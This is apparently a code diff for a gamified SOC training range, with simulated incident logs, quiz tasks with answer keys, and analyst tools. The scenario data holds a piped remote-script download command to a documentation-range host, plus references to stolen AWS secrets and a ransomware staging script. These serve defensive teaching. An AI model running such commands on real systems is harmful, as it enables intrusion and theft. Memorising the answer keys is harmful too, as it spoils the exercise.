+            '04:03:29 | EDGE-GW-01 | cron  | Scheduled /usr/local/bin/vault_locker.sh (ransom note: SHADOWVAULT_README.txt)'
+          ].join('\n')
+        },
+        logs: [
+          { ts: '04:01:12', host: 'EDGE-GW-01', source: 'nginx', severity: 'high', msg: 'Command injection payload in POST /api/v2/diagnostics from 198.51.100.200' },
+          { ts: '04:01:15', host: 'EDGE-GW-01', source: 'auditd', severity: 'critical', msg: 'Piped remote script execution: curl -s http://198.51.100.200/drop.sh | sh' },
+          { ts: '04:02:03', host: 'EDGE-GW-01', source: 'auditd', severity: 'critical', msg: 'Sensitive credential file accessed: /opt/app/.env.bak' },
+          { ts: '04:03:29', host: 'EDGE-GW-01', source: 'cron', severity: 'critical', msg: 'Ransomware stage script /usr/local/bin/vault_locker.sh staged with note SHADOWVAULT_README.txt' }
+        ],
+        tasks: [
+          {
+            id: 'RM-401-T1',
+            title: 'Identify the Exploited Endpoint Path',
+            xp: 130,
+            prompt: 'Which HTTP endpoint path received the command injection payload in `nginx`?',
+            hint: 'Look at `POST &lt;path&gt;` in the first log line.',
+            example: '/api/v2/diagnostics',
+            answer: '/api/v2/diagnostics',
+            accepted: ['/api/v2/diagnostics']
+          },
+          {
+            id: 'RM-401-T2',
+            title: 'Spot the Exposed Secrets File',
+            xp: 140,
+            prompt: 'Which backup environment file contained `AWS_SECRET_ACCESS_KEY`?',
+            hint: 'Check the `grep` / `auditd` line at 04:02:03.',
+            example: '/opt/app/.env.bak',
+            answer: '/opt/app/.env.bak',
+            accepted: ['/opt/app/.env.bak', '.env.bak']
+          },
+          {
+            id: 'RM-401-T3',
+            title: 'Find the Ransomware Staging Script',
+            xp: 145,
+            prompt: 'What script path was scheduled prior to encryption?',
+            hint: 'Look after `Scheduled ` in the `cron` log entry.',
+            example: '/usr/local/bin/vault_locker.sh',
+            answer: '/usr/local/bin/vault_locker.sh',
+            accepted: ['/usr/local/bin/vault_locker.sh', 'vault_locker.sh']
+          },
+          {
+            id: 'RM-401-T4',
+            title: 'Identify the Ransom Note Filename',
+            xp: 145,
+            prompt: 'What ransom note filename was associated with `vault_locker.sh`?',
+            hint: 'Look inside the parentheses on the `cron` line.',
+            example: 'SHADOWVAULT_README.txt',
+            answer: 'SHADOWVAULT_README.txt',
+            accepted: ['SHADOWVAULT_README.txt']
+          }
+        ]
+      }
+    ];
+
+    const TIER_STYLES = {
+      emerald: {
+        badge: 'bg-emerald-500/10 text-emerald-300 border-emerald-500/30',
+        border: 'hover:border-emerald-500/50',
+        pill: 'bg-emerald-500'
+      },
+      cyan: {
+        badge: 'bg-cyan-500/10 text-cyan-300 border-cyan-500/30',
+        border: 'hover:border-cyan-500/50',
+        pill: 'bg-cyan-500'
+      },
+      amber: {
+        badge: 'bg-amber-500/10 text-amber-300 border-amber-500/30',
+        border: 'hover:border-amber-500/50',
+        pill: 'bg-amber-500'
+      },
+      fuchsia: {
+        badge: 'bg-fuchsia-500/10 text-fuchsia-300 border-fuchsia-500/30',
+        border: 'hover:border-fuchsia-500/50',
+        pill: 'bg-fuchsia-500'
+      }
+    };
+
+    const SEVERITY_BADGE = {
+      low: 'bg-slate-800 text-slate-300 border-slate-700',
+      medium: 'bg-amber-500/15 text-amber-300 border-amber-500/30',
+      high: 'bg-orange-500/15 text-orange-300 border-orange-500/30',
+      critical: 'bg-rose-500/15 text-rose-300 border-rose-500/30'
+    };
+
+    const DEFAULT_PROGRESS = {
+      xp: 0,
+      streak: 1,
+      completedTasks: [],
+      completedRooms: [],
+      skills: {
+        logAnalysis: 10,
+        incidentTriage: 10,
+        threatIntel: 10,
+        forensics: 10,
+        detectionEng: 10
+      },
+      containedHosts: [],
+      sigmaRules: []
+    };
+
+    const STORAGE_KEY = 'cyberops_range_progress_v1';
+
+    function getRankForXP(xp) {
+      let current = RANKS[0];
+      let next = RANKS[1] || null;
+      for (let i = 0; i &lt; RANKS.length; i++) {
+        if (xp &gt;= RANKS[i].minXP) {
+          current = RANKS[i];
+          next = RANKS[i + 1] || null;
+        }
+      }
+      const progressPct = next
+        ? Math.min(100, Math.max(0, Math.round(((xp - current.minXP) / (next.minXP - current.minXP)) * 100)))
+        : 100;
+      return { current, next, progressPct };
+    }
+
+    function decodeBase64Safe(str) {
+      try {
+        const clean = str.trim();
+        if (!clean || clean.length % 4 === 1 || !/^[A-Za-z0-9+/=]+$/.test(clean)) {
+          return '[Error: Invalid Base64 input]';
+        }
+        const bin = atob(clean);
+        const bytes = new Uint8Array(bin.length);
+        for (let i = 0; i &lt; bin.length; i++) bytes[i] = bin.charCodeAt(i);
+        return new TextDecoder('utf-8', { fatal: false }).decode(bytes);
+      } catch {
+        return '[Error: Invalid Base64 input]';
+      }
+    }
+
+    function encodeBase64Safe(str) {
+      try {
+        const bytes = new TextEncoder().encode(str);
+        let bin = '';
+        for (let i = 0; i &lt; bytes.length; i++) bin += String.fromCharCode(bytes[i]);
+        return btoa(bin);
+      } catch {
+        return '[Error: Unable to encode input]';
+      }
+    }
+
+    function decodeHexSafe(hexStr) {
+      try {
+        const clean = hexStr.replace(/[^0-9a-fA-F]/g, '');
+        if (!clean || clean.length % 2 !== 0) {
+          return '[Error: Hex string must have an even number of hex digits]';
+        }
+        const bytes = new Uint8Array(clean.length / 2);
+        for (let i = 0; i &lt; clean.length; i += 2) {
+          bytes[i / 2] = parseInt(clean.slice(i, i + 2), 16);
+        }
+        return new TextDecoder('utf-8', { fatal: false }).decode(bytes);
+      } catch {
+        return '[Error: Invalid Hex input]';
+      }
+    }
+
+    function rot13(str) {
+      return str.replace(/[a-zA-Z]/g, (c) =&gt; {
+        const base = c &lt;= 'Z' ? 65 : 97;
+        return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
+      });
+    }
+
+    function renderBadgeIcon(iconName, className = 'w-5 h-5') {
+      const map = { Flag, Terminal, Mail, Cpu, Globe, Key, HardDrive, Trophy };
+      const Comp = map[iconName] || Award;
+      return &lt;Comp className={className} /&gt;;
+    }
+
+    // ============================================================================
+    // SKILL RADAR SVG
+    // ============================================================================
+
+    function SkillRadar({ skills }) {
+      const size = 240;
+      const cx = size / 2;
+      const cy = size / 2;
+      const radius = 78;
+      const count = SKILL_DOMAINS.length;
+
+      const getPoint = (index, ratio) =&gt; {
+        const angle = (Math.PI * 2 * index) / count - Math.PI / 2;
+        return {
+          x: cx + Math.cos(angle) * radius * ratio,
+          y: cy + Math.sin(angle) * radius * ratio
+        };
+      };
+
+      const rings = [0.25, 0.5, 0.75, 1];
+      const dataPoints = SKILL_DOMAINS.map((d, i) =&gt; {
+        const val = Math.min(100, Math.max(0, skills[d.key] || 0));
+        return getPoint(i, val / 100);
+      });
+      const polygonStr = dataPoints.map((p) =&gt; `${p.x.toFixed(1)},${p.y.toFixed(1)}`).join(' ');
+
+      return (
+        &lt;div className=&quot;flex flex-col items-center&quot;&gt;
+          &lt;svg width={size} height={size} viewBox={`0 0 ${size} ${size}`} className=&quot;overflow-visible&quot;&gt;
+            {rings.map((r) =&gt; {
+              const pts = SKILL_DOMAINS.map((_, i) =&gt; {
+                const p = getPoint(i, r);
+                return `${p.x.toFixed(1)},${p.y.toFixed(1)}`;
+              }).join(' ');
+              return (
+                &lt;polygon
+                  key={r}
+                  points={pts}
+                  fill=&quot;none&quot;
+                  stroke=&quot;rgba(148, 163, 184, 0.18)&quot;
+                  strokeWidth=&quot;1&quot;
+                /&gt;
+              );
+            })}
+            {SKILL_DOMAINS.map((d, i) =&gt; {
+              const end = getPoint(i, 1);
+              const labelPt = getPoint(i, 1.24);
+              return (
+                &lt;g key={d.key}&gt;
+                  &lt;line
+                    x1={cx}
+                    y1={cy}
+                    x2={end.x}
+                    y2={end.y}
+                    stroke=&quot;rgba(148, 163, 184, 0.18)&quot;
+                    strokeWidth=&quot;1&quot;
+                  /&gt;
+                  &lt;text
+                    x={labelPt.x}
+                    y={labelPt.y}
+                    textAnchor=&quot;middle&quot;
+                    dominantBaseline=&quot;middle&quot;
+                    className=&quot;fill-slate-300 text-[10px] font-medium&quot;
+                  &gt;
+                    {d.short}
+                  &lt;/text&gt;
+                &lt;/g&gt;
+              );
+            })}
+            &lt;polygon
+              points={polygonStr}
+              fill=&quot;rgba(34, 211, 238, 0.22)&quot;
+              stroke=&quot;#22d3ee&quot;
+              strokeWidth=&quot;2&quot;
+            /&gt;
+            {dataPoints.map((p, i) =&gt; (
+              &lt;circle key={i} cx={p.x} cy={p.y} r=&quot;3.5&quot; fill=&quot;#67e8f9&quot; /&gt;
+            ))}
+          &lt;/svg&gt;
+        &lt;/div&gt;
+      );
+    }
+
+    // ============================================================================
+    // WORKBENCH (SIEM, TERMINAL, CYBERCHEF/TI, SIGMA/CONTAINMENT)
+    // ============================================================================
+
+    function LabWorkbench({ room, progress, onToggleContain, onAddSigmaRule }) {
+      const [activeTab, setActiveTab] = useState('siem');
+      const [logFilter, setLogFilter] = useState('');
+      const [sevFilter, setSevFilter] = useState('all');
+
+      const [termInput, setTermInput] = useState('');
+      const [termHistory, setTermHistory] = useState([
+        { type: 'sys', text: `Connected to ${room.id} lab host. Type 'help' or 'ls' to inspect artifacts.` }
+      ]);
+
+      const [chefInput, setChefInput] = useState('cG93ZXJzaGVsbCAtZW5jIERvd25sb2FkUGF5bG9hZCgp');
+      const [chefOutput, setChefOutput] = useState('');
+      const [tiQuery, setTiQuery] = useState('185.220.101.44');
+
+      const [ruleTitle, setRuleTitle] = useState(`Detect_${room.id}_Anomaly`);
+      const [rulePattern, setRulePattern] = useState('CommandLine|contains: &quot;powershell&quot;');
+      const [targetHost, setTargetHost] = useState(room.logs[0]?.host || 'WKSTN-01');
+
+      const termEndRef = useRef(null);
+
+      useEffect(() =&gt; {
+        setTermHistory([
+          { type: 'sys', text: `Switched context to ${room.id} (${room.title}). Type 'help' for available commands.` }
+        ]);
+        const defaultHost = room.logs[0]?.host || 'WKSTN-01';
+        setTargetHost(defaultHost);
+        setRuleTitle(`Detect_${room.id}_Anomaly`);
+        setLogFilter('');
+        setSevFilter('all');
+      }, [room.id, room.title, room.logs]);
+
+      useEffect(() =&gt; {
+        if (activeTab === 'terminal' &amp;&amp; termEndRef.current) {
+          termEndRef.current.scrollIntoView({ behavior: 'smooth' });
+        }
+      }, [termHistory, activeTab]);
+
+      const availableHosts = useMemo(() =&gt; {
+        const list = [...new Set(room.logs.map((l) =&gt; l.host))];
+        return list.length &gt; 0 ? list : [targetHost];
+      }, [room.logs, targetHost]);
+
+      useEffect(() =&gt; {
+        if (!availableHosts.includes(targetHost) &amp;&amp; availableHosts.length &gt; 0) {
+          setTargetHost(availableHosts[0]);
+        }
+      }, [availableHosts, targetHost]);
+
+      const filteredLogs = useMemo(() =&gt; {
+        return room.logs.filter((l) =&gt; {
+          const matchesSev = sevFilter === 'all' || l.severity === sevFilter;
+          const q = logFilter.trim().toLowerCase();
+          const matchesQuery =
+            !q ||
+            l.msg.toLowerCase().includes(q) ||
+            l.source.toLowerCase().includes(q) ||
+            l.host.toLowerCase().includes(q) ||
+            l.ts.toLowerCase().includes(q);
+          return matchesSev &amp;&amp; matchesQuery;
+        });
+      }, [room.logs, logFilter, sevFilter]);
+
+      const runTerminalCommand = (rawCmd) =&gt; {
+        const trimmed = rawCmd.trim();
+        if (!trimmed) return;
+
+        const nextLines = [{ type: 'cmd', text: `analyst@${room.id.toLowerCase()}:~$ ${trimmed}` }];
+
+        if (trimmed === 'clear') {
+          setTermHistory([]);
+          return;
+        }
+
+        if (trimmed === 'help') {
+          nextLines.push({
+            type: 'out',
+            text: [
+              'Available commands:',
+              '  ls                     List available virtual files in this room',
+              '  cat &lt;path&gt;             Display file contents (e.g. cat /var/log/auth.log)',
+              '  grep [-i] &lt;pat&gt; &lt;path&gt; Search lines matching pattern',
+              '  head -n &lt;N&gt; &lt;path&gt;     Show first N lines (default 5)',
+              '  tail -n &lt;N&gt; &lt;path&gt;     Show last N lines (default 5)',
+              '  wc -l &lt;path&gt;           Count lines in a file',
+              '  whoami / id / uname -a System identity info',
+              '  echo &quot;&lt;str&gt;&quot; | base64 -d   Decode Base64 string',
+              '  volatility -f &lt;img.raw&gt; pslist|netscan|cmdline   Simulated memory forensics',
+              '  clear                  Clear terminal output'
+            ].join('\n')
+          });
+          setTermHistory((prev) =&gt; [...prev, ...nextLines]);
+          return;
+        }
+
+        if (trimmed === 'whoami') {
+          nextLines.push({ type: 'out', text: 'soc_analyst' });
+          setTermHistory((prev) =&gt; [...prev, ...nextLines]);
+          return;
+        }
+
+        if (trimmed === 'id') {
+          nextLines.push({ type: 'out', text: 'uid=1001(soc_analyst) gid=1001(blue_team) groups=1001(blue_team),27(sudo)' });
+          setTermHistory((prev) =&gt; [...prev, ...nextLines]);
+          return;
+        }
+
+        if (trimmed === 'uname -a') {
+          nextLines.push({ type: 'out', text: 'Linux cyberops-range 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux' });
+          setTermHistory((prev) =&gt; [...prev, ...nextLines]);
+          return;
+        }
+
+        const pipeB64Match = trimmed.match(/^echo\s+[&quot;']?(.+?)[&quot;']?\s*\|\s*base64\s+-d$/i);
+        if (pipeB64Match) {
+          nextLines.push({ type: 'out', text: decodeBase64Safe(pipeB64Match[1]) });
+          setTermHistory((prev) =&gt; [...prev, ...nextLines]);
+          return;
+        }
+
+        if (trimmed === 'ls' || trimmed.startsWith('ls ')) {
+          const files = Object.keys(room.filesystem || {});
+          nextLines.push({ type: 'out', text: files.length ? files.join('\n') : '(no files)' });
+          setTermHistory((prev) =&gt; [...prev, ...nextLines]);
+          return;
+        }
+
+        const catMatch = trimmed.match(/^cat\s+(.+)$/);
+        if (catMatch) {
+          const pathArg = catMatch[1].trim();
+          const content = room.filesystem?.[pathArg];
+          if (content !== undefined) {
+            nextLines.push({ type: 'out', text: content });
+          } else {
+            nextLines.push({ type: 'err', text: `cat: ${pathArg}: No such file or directory` });
+          }
+          setTermHistory((prev) =&gt; [...prev, ...nextLines]);
+          return;
+        }
+
+        const wcMatch = trimmed.match(/^wc\s+-l\s+(.+)$/);
+        if (wcMatch) {
+          const pathArg = wcMatch[1].trim();
+          const content = room.filesystem?.[pathArg];
+          if (content !== undefined) {
+            const lines = content.split('\n').length;
+            nextLines.push({ type: 'out', text: `${lines} ${pathArg}` });
+          } else {
+            nextLines.push({ type: 'err', text: `wc: ${pathArg}: No such file or directory` });
+          }
+          setTermHistory((prev) =&gt; [...prev, ...nextLines]);
+          return;
+        }
+
+        const headTailMatch = trimmed.match(/^(head|tail)(?:\s+-n\s+(\d+))?\s+(.+)$/);
+        if (headTailMatch) {
+          const mode = headTailMatch[1];
+          const parsedN = parseInt(headTailMatch[2] || '5', 10);
+          const n = Number.isFinite(parsedN) &amp;&amp; parsedN &gt; 0 ? parsedN : 5;
+          const pathArg = headTailMatch[3].trim();
+          const content = room.filesystem?.[pathArg];
+          if (content === undefined) {
+            nextLines.push({ type: 'err', text: `${mode}: ${pathArg}: No such file or directory` });
+          } else {
+            const arr = content.split('\n');
+            const sliced = mode === 'head' ? arr.slice(0, n) : arr.slice(Math.max(0, arr.length - n));
+            nextLines.push({ type: 'out', text: sliced.join('\n') });
+          }
+          setTermHistory((prev) =&gt; [...prev, ...nextLines]);
+          return;
+        }
+
+        const grepMatch = trimmed.match(/^grep\s+(?:-i\s+)?[&quot;']?([^&quot;'\s]+)[&quot;']?\s+(.+)$/);
+        if (grepMatch) {
+          const needle = grepMatch[1].toLowerCase();
+          const pathArg = grepMatch[2].trim();
+          const content = room.filesystem?.[pathArg];
+          if (content === undefined) {
+            nextLines.push({ type: 'err', text: `grep: ${pathArg}: No such file or directory` });
+          } else {
+            const matches = content
+              .split('\n')
+              .filter((line) =&gt; line.toLowerCase().includes(needle));
+            nextLines.push({
+              type: 'out',
+              text: matches.length ? matches.join('\n') : `(no matches for '${grepMatch[1]}')`
+            });
+          }
+          setTermHistory((prev) =&gt; [...prev, ...nextLines]);
+          return;
+        }
+
+        const volMatch = trimmed.match(/^(?:volatility|vol\.py)\s+-f\s+\S+\s+(pslist|netscan|cmdline)$/i);
+        if (volMatch) {
+          const plugin = volMatch[1].toLowerCase();
+          const memIndex = room.filesystem?.['/dfir/memdump_srv04.raw.index'];
+          if (memIndex) {
+            nextLines.push({ type: 'out', text: `[Volatility 3 - ${plugin}]\n${memIndex}` });
+          } else {
+            nextLines.push({
+              type: 'out',
+              text: `[Volatility 3 - ${plugin}]\nPID 104  systemd\nPID 412  sshd\nPID 880  wazuh-agentd`
+            });
+          }
+          setTermHistory((prev) =&gt; [...prev, ...nextLines]);
+          return;
+        }
+
+        nextLines.push({
+          type: 'err',
+          text: `Command not found: ${trimmed}. Type 'help' for supported lab commands.`
+        });
+        setTermHistory((prev) =&gt; [...prev, ...nextLines]);
+      };
+
+      const handleTermSubmit = (e) =&gt; {
+        e.preventDefault();
+        runTerminalCommand(termInput);
+        setTermInput('');
+      };
+
+      const tiAssessment = useMemo(() =&gt; {
+        const q = tiQuery.trim();
+        if (!q) return null;
+        if (q.includes('185.220.101.44')) {
+          return { verdict: 'Malicious (Tor Exit / Brute-Force Node)', confidence: 'High', tags: ['SSH Brute-Force', 'Recon'] };
+        }
+        if (q.includes('91.214.124.88') || q.includes('secure-hr-update.com')) {
+          return { verdict: 'Suspicious / Phishing Infrastructure', confidence: 'High', tags: ['SPF/DMARC Fail', 'BEC/Credential Lure'] };
+        }
+        if (q.includes('198.51.100.') || q.includes('203.0.113.') || q.includes('192.0.2.')) {
+          return { verdict: 'TEST-NET Lab Indicator (Simulated C2 / Staging)', confidence: 'Lab IOC', tags: ['RFC 5737 Documentation Range', 'Lab Scenario'] };
+        }
+        if (q.includes('darktunnel-ops.io')) {
+          return { verdict: 'Malicious C2 / DNS Tunnel Domain', confidence: 'High', tags: ['TXT Exfiltration', 'High Entropy'] };
+        }
+        return { verdict: 'No Known Bad Match in Local Lab Feed', confidence: 'Low', tags: ['Unclassified IOC', 'Pivot in SIEM'] };
+      }, [tiQuery]);
+
+      const isHostContained = progress.containedHosts.includes(targetHost);
+
+      return (
+        &lt;div className=&quot;bg-slate-900/80 border border-slate-800 rounded-xl overflow-hidden flex flex-col h-full min-h-[540px]&quot;&gt;
+          &lt;div className=&quot;flex flex-wrap items-center justify-between gap-2 px-3 py-2.5 bg-slate-950/90 border-b border-slate-800&quot;&gt;
+            &lt;div className=&quot;flex flex-wrap items-center gap-1&quot;&gt;
+              {[
+                { id: 'siem', label: 'SIEM Logs', icon: Activity },
+                { id: 'terminal', label: 'Linux / DFIR Terminal', icon: Terminal },
+                { id: 'chef', label: 'CyberChef &amp; TI', icon: Wrench },
+                { id: 'sigma', label: 'Sigma &amp; Containment', icon: Shield }
+              ].map((t) =&gt; {
+                const Icon = t.icon;
+                const active = activeTab === t.id;
+                return (
+                  &lt;button
+                    key={t.id}
+                    type=&quot;button&quot;
+                    onClick={() =&gt; setActiveTab(t.id)}
+                    className={`flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg text-xs font-medium transition ${
+                      active
+                        ? 'bg-cyan-500/15 text-cyan-300 border border-cyan-500/40'
+                        : 'text-slate-400 hover:text-slate-200 hover:bg-slate-900 border border-transparent'
+                    }`}
+                  &gt;
+                    &lt;Icon className=&quot;w-3.5 h-3.5&quot; /&gt;
+                    {t.label}
+                  &lt;/button&gt;
+                );
+              })}
+            &lt;/div&gt;
+            &lt;span className=&quot;text-[11px] font-mono text-slate-400 px-2 py-0.5 rounded bg-slate-900 border border-slate-800&quot;&gt;
+              HOST: {targetHost}
+            &lt;/span&gt;
+          &lt;/div&gt;
+
+          {/* TAB 1: SIEM LOG EXPLORER */}
+          {activeTab === 'siem' &amp;&amp; (
+            &lt;div className=&quot;p-3.5 flex-1 flex flex-col gap-3&quot;&gt;
+              &lt;div className=&quot;flex flex-wrap items-center gap-2&quot;&gt;
+                &lt;div className=&quot;relative flex-1 min-w-[180px]&quot;&gt;
+                  &lt;Search className=&quot;w-3.5 h-3.5 text-slate-400 absolute left-2.5 top-1/2 -translate-y-1/2&quot; /&gt;
+                  &lt;input
+                    type=&quot;text&quot;
+                    value={logFilter}
+                    onChange={(e) =&gt; setLogFilter(e.target.value)}
+                    placeholder=&quot;Filter logs by IP, user, process, or keyword...&quot;
+                    className=&quot;w-full pl-8 pr-3 py-1.5 bg-slate-950 border border-slate-800 rounded-lg text-xs text-slate-100 placeholder:text-slate-500 focus:outline-none focus:border-cyan-500&quot;
+                  /&gt;
+                &lt;/div&gt;
+                &lt;select
+                  value={sevFilter}
+                  onChange={(e) =&gt; setSevFilter(e.target.value)}
+                  className=&quot;px-2.5 py-1.5 bg-slate-950 border border-slate-800 rounded-lg text-xs text-slate-200 focus:outline-none focus:border-cyan-500&quot;
+                &gt;
+                  &lt;option value=&quot;all&quot;&gt;All Severities&lt;/option&gt;
+                  &lt;option value=&quot;critical&quot;&gt;Critical&lt;/option&gt;
+                  &lt;option value=&quot;high&quot;&gt;High&lt;/option&gt;
+                  &lt;option value=&quot;medium&quot;&gt;Medium&lt;/option&gt;
+                  &lt;option value=&quot;low&quot;&gt;Low&lt;/option&gt;
+                &lt;/select&gt;
+              &lt;/div&gt;
+
+              &lt;div className=&quot;space-y-2 overflow-y-auto max-h-[410px] pr-1&quot;&gt;
+                {filteredLogs.length === 0 ? (
+                  &lt;div className=&quot;text-center py-10 text-xs text-slate-400 border border-dashed border-slate-800 rounded-lg&quot;&gt;
+                    No telemetry events match your filter criteria.
+                  &lt;/div&gt;
+                ) : (
+                  filteredLogs.map((entry, idx) =&gt; (
+                    &lt;div
+                      key={idx}
+                      className=&quot;p-2.5 rounded-lg bg-slate-950/90 border border-slate-800/90 hover:border-slate-700 transition font-mono text-xs&quot;
+                    &gt;
+                      &lt;div className=&quot;flex flex-wrap items-center justify-between gap-2 mb-1&quot;&gt;
+                        &lt;div className=&quot;flex items-center gap-2 text-slate-400&quot;&gt;
+                          &lt;span className=&quot;text-cyan-400&quot;&gt;{entry.ts}&lt;/span&gt;
+                          &lt;span&gt;•&lt;/span&gt;
+                          &lt;span className=&quot;text-slate-300&quot;&gt;{entry.host}&lt;/span&gt;
+                          &lt;span&gt;•&lt;/span&gt;
+                          &lt;span className=&quot;text-indigo-300&quot;&gt;{entry.source}&lt;/span&gt;
+                        &lt;/div&gt;
+                        &lt;span
+                          className={`px-2 py-0.5 rounded text-[10px] uppercase font-semibold border ${
+                            SEVERITY_BADGE[entry.severity] || SEVERITY_BADGE.low
+                          }`}
+                        &gt;
+                          {entry.severity}
+                        &lt;/span&gt;
+                      &lt;/div&gt;
+                      &lt;p className=&quot;text-slate-200 break-all&quot;&gt;{entry.msg}&lt;/p&gt;
+                    &lt;/div&gt;
+                  ))
+                )}
+              &lt;/div&gt;
+            &lt;/div&gt;
+          )}
+
+          {/* TAB 2: TERMINAL */}
+          {activeTab === 'terminal' &amp;&amp; (
+            &lt;div className=&quot;p-3.5 flex-1 flex flex-col justify-between bg-slate-950 font-mono text-xs&quot;&gt;
+              &lt;div className=&quot;space-y-1.5 overflow-y-auto max-h-[375px] pr-1 mb-3&quot;&gt;
+                {termHistory.map((line, idx) =&gt; (
+                  &lt;div
+                    key={idx}
+                    className={`whitespace-pre-wrap break-words leading-relaxed ${
+                      line.type === 'cmd'
+                        ? 'text-cyan-300 font-semibold'
+                        : line.type === 'err'
+                        ? 'text-rose-400'
+                        : line.type === 'sys'
+                        ? 'text-amber-300/90'
+                        : 'text-slate-200'
+                    }`}
+                  &gt;
+                    {line.text}
+                  &lt;/div&gt;
+                ))}
+                &lt;div ref={termEndRef} /&gt;
+              &lt;/div&gt;
+              &lt;form onSubmit={handleTermSubmit} className=&quot;flex items-center gap-2 pt-2 border-t border-slate-800&quot;&gt;
+                &lt;span className=&quot;text-emerald-400 shrink-0&quot;&gt;$&lt;/span&gt;
+                &lt;input
+                  type=&quot;text&quot;
+                  value={termInput}
+                  onChange={(e) =&gt; setTermInput(e.target.value)}
+                  placeholder=&quot;Type 'ls', 'cat /var/log/auth.log', 'grep failed /var/log/auth.log'...&quot;
+                  className=&quot;flex-1 bg-transparent text-slate-100 placeholder:text-slate-600 focus:outline-none&quot;
+                /&gt;
+                &lt;button
+                  type=&quot;submit&quot;
+                  className=&quot;px-3 py-1 rounded bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 hover:bg-cyan-500/30 transition&quot;
+                &gt;
+                  Run
+                &lt;/button&gt;
+              &lt;/form&gt;
+            &lt;/div&gt;
+          )}
+
+          {/* TAB 3: CYBERCHEF &amp; THREAT INTEL */}
+          {activeTab === 'chef' &amp;&amp; (
+            &lt;div className=&quot;p-3.5 flex-1 grid grid-cols-1 lg:grid-cols-2 gap-3.5 overflow-y-auto&quot;&gt;
+              &lt;div className=&quot;p-3 rounded-lg bg-slate-950/90 border border-slate-800 flex flex-col gap-2.5&quot;&gt;
+                &lt;div className=&quot;flex items-center justify-between&quot;&gt;
+                  &lt;span className=&quot;text-xs font-semibold text-cyan-300 uppercase tracking-wider&quot;&gt;
+                    CyberChef-Lite Decoder
+                  &lt;/span&gt;
+                  &lt;span className=&quot;text-[11px] text-slate-400&quot;&gt;Base64 / Hex / ROT13&lt;/span&gt;
+                &lt;/div&gt;
+                &lt;textarea
+                  rows={3}
+                  value={chefInput}
+                  onChange={(e) =&gt; setChefInput(e.target.value)}
+                  placeholder=&quot;Paste encoded string here...&quot;
+                  className=&quot;w-full p-2 rounded bg-slate-900 border border-slate-800 font-mono text-xs text-slate-100 focus:outline-none focus:border-cyan-500&quot;
+                /&gt;
+                &lt;div className=&quot;flex flex-wrap gap-1.5&quot;&gt;
+                  &lt;button
+                    type=&quot;button&quot;
+                    onClick={() =&gt; setChefOutput(decodeBase64Safe(chefInput))}
+                    className=&quot;px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-xs text-slate-200&quot;
+                  &gt;
+                    From Base64
+                  &lt;/button&gt;
+                  &lt;button
+                    type=&quot;button&quot;
+                    onClick={() =&gt; setChefOutput(encodeBase64Safe(chefInput))}
+                    className=&quot;px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-xs text-slate-200&quot;
+                  &gt;
+                    To Base64
+                  &lt;/button&gt;
+                  &lt;button
+                    type=&quot;button&quot;
+                    onClick={() =&gt; setChefOutput(decodeHexSafe(chefInput))}
+                    className=&quot;px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-xs text-slate-200&quot;
+                  &gt;
+                    From Hex
+                  &lt;/button&gt;
+                  &lt;button
+                    type=&quot;button&quot;
+                    onClick={() =&gt; setChefOutput(rot13(chefInput))}
+                    className=&quot;px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-xs text-slate-200&quot;
+                  &gt;
+                    ROT13
+                  &lt;/button&gt;
+                &lt;/div&gt;
+                &lt;div className=&quot;p-2.5 rounded bg-slate-900 border border-slate-800 min-h-[72px] font-mono text-xs text-emerald-300 break-all&quot;&gt;
+                  {chefOutput || 'Output will appear here...'}
+                &lt;/div&gt;
+              &lt;/div&gt;
+
+              &lt;div className=&quot;p-3 rounded-lg bg-slate-950/90 border border-slate-800 flex flex-col gap-2.5&quot;&gt;
+                &lt;span className=&quot;text-xs font-semibold text-amber-300 uppercase tracking-wider&quot;&gt;
+                  Threat Intel IOC Enrichment
+                &lt;/span&gt;
+                &lt;input
+                  type=&quot;text&quot;
+                  value={tiQuery}
+                  onChange={(e) =&gt; setTiQuery(e.target.value)}
+                  placeholder=&quot;Enter IP, domain, or indicator...&quot;
+                  className=&quot;w-full px-2.5 py-1.5 rounded bg-slate-900 border border-slate-800 font-mono text-xs text-slate-100 focus:outline-none focus:border-cyan-500&quot;
+                /&gt;
+                {tiAssessment &amp;&amp; (
+                  &lt;div className=&quot;p-3 rounded-lg bg-slate-900 border border-slate-800 space-y-2 text-xs&quot;&gt;
+                    &lt;div className=&quot;flex items-center justify-between&quot;&gt;
+                      &lt;span className=&quot;font-semibold text-slate-100&quot;&gt;{tiAssessment.verdict}&lt;/span&gt;
+                      &lt;span className=&quot;px-2 py-0.5 rounded bg-cyan-500/15 text-cyan-300 border border-cyan-500/30 text-[11px]&quot;&gt;
+                        {tiAssessment.confidence}
+                      &lt;/span&gt;
+                    &lt;/div&gt;
+                    &lt;div className=&quot;flex flex-wrap gap-1.5&quot;&gt;
+                      {tiAssessment.tags.map((tag) =&gt; (
+                        &lt;span
+                          key={tag}
+                          className=&quot;px-2 py-0.5 rounded bg-slate-800 text-slate-300 text-[11px]&quot;
+                        &gt;
+                          {tag}
+                        &lt;/span&gt;
+                      ))}
+                    &lt;/div&gt;
+                  &lt;/div&gt;
+                )}
+              &lt;/div&gt;
+            &lt;/div&gt;
+          )}
+
+          {/* TAB 4: SIGMA &amp; CONTAINMENT */}
+          {activeTab === 'sigma' &amp;&amp; (
+            &lt;div className=&quot;p-3.5 flex-1 grid grid-cols-1 lg:grid-cols-2 gap-3.5 overflow-y-auto&quot;&gt;
+              &lt;div className=&quot;p-3 rounded-lg bg-slate-950/90 border border-slate-800 space-y-2.5&quot;&gt;
+                &lt;span className=&quot;text-xs font-semibold text-indigo-300 uppercase tracking-wider block&quot;&gt;
+                  Draft Detection Rule (Sigma-Style)
+                &lt;/span&gt;
+                &lt;input
+                  type=&quot;text&quot;
+                  value={ruleTitle}
+                  onChange={(e) =&gt; setRuleTitle(e.target.value)}
+                  className=&quot;w-full px-2.5 py-1.5 rounded bg-slate-900 border border-slate-800 text-xs text-slate-100&quot;
+                  placeholder=&quot;Rule title&quot;
+                /&gt;
+                &lt;textarea
+                  rows={3}
+                  value={rulePattern}
+                  onChange={(e) =&gt; setRulePattern(e.target.value)}
